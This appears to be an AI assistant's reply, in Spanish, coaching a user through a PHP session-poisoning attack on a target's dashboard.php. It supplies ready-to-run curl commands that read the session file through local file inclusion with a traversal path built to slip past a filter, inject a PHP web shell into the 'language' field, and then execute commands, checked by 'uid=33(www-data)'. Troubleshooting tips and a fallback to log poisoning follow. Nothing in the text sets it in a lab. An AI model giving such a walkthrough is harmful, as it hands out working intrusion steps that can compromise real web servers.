Dale, vamos con session poisoning. Pero hagámoslo bien, porque tiene un orden de pasos que no podés saltear o no funciona. El problema de tu intento original no era solo el `sess_PHPSESSID=` mal escrito — es que primero hay que **confirmar que algo de tu input se guarda en el archivo de sesión**, sino no hay nada que ejecutar.

**Paso 1 — Confirmar el path y leer tu propio archivo de sesión.**

Tu `PHPSESSID` actual está en `$C`. Sacá el valor:

```bash
SID=$(grep -oE 'PHPSESSID[[:space:]]+[a-z0-9]+' "$C" | awk '{print $2}')
# o si guardaste el ID a mano, SID=d54gmle0b0cso22dq9h5lld4me
echo "SID=$SID"
```

Ahora incluí tu archivo de sesión por LFI y mirá qué contiene:

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  | grep -aiE 'language|user|admin|en\.php|[a-z_]+\|'
```

Lo que buscás: ver **tu propio input reflejado** en el contenido serializado de PHP (algo tipo `language|s:6:"en.php";` o `username|s:...`). Si ves un campo que vos controlás, ese es el que vas a envenenar. Si el archivo viene vacío o no aparece tu input, el session poisoning **no es viable** y hay que ir al log.

**Paso 2 — Envenenar la sesión con PHP.**

Esto depende de _qué_ campo se persiste. El candidato obvio es el propio `language`: si el dashboard guarda el valor de `language` en `$_SESSION`, mandás PHP como valor:

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode 'language=<?php system($_POST["cmd"]); ?>' -o /dev/null
```

(ojo: esto requiere que el dashboard guarde `language` en sesión _antes_ de pasarlo al include, o que el guardado ocurra en otra request. Por eso el Paso 1 es obligatorio: te dice qué campo y en qué request se escribe.)

**Paso 3 — Incluir la sesión envenenada y ejecutar.**

```bash
curl -s -b "$C" -X POST "$T/dashboard.php" \
  --data-urlencode "language=....//....//....//....//var/lib/php/sessions/sess_$SID" \
  --data-urlencode 'cmd=id' | grep -a 'uid='
```

Si aparece `uid=33(www-data)`, RCE conseguido.

Tres cosas que te van a hacer tropezar, anticipándolas:

- **El path puede no ser `/var/lib/php/sessions/`.** En algunos PHP es `/var/lib/php/sessions/`, en otros `/tmp/`, o `/var/lib/php<version>/sessions/`. Si el Paso 1 no devuelve nada, probá `....//....//....//....//tmp/sess_$SID`.
- **`www-data` tiene que poder leer el archivo de sesión.** Normalmente sí lee los que él mismo creó.
- **El nombre es `sess_` + el ID crudo**, nada de `PHPSESSID=`. Eso ya lo corregimos.

Te soy honesto sobre las expectativas: en este patrón (filtro de `language` con `.php` esperado, según el dropdown `?language=en.php`), es muy posible que el valor que se incluye **no** sea el mismo que se persiste en sesión, o que se le concatene `.php` y rompa la inclusión del `sess_`. Por eso el Paso 1 es decisivo. Si ahí no ves tu input reflejado limpio en el archivo de sesión, el log poisoning es bastante más directo y te recomiendo saltar a eso.

Corré el **Paso 1** y pegame qué devuelve — con ver el contenido de tu `sess_` sabemos si el vector es viable y cuál campo envenenar.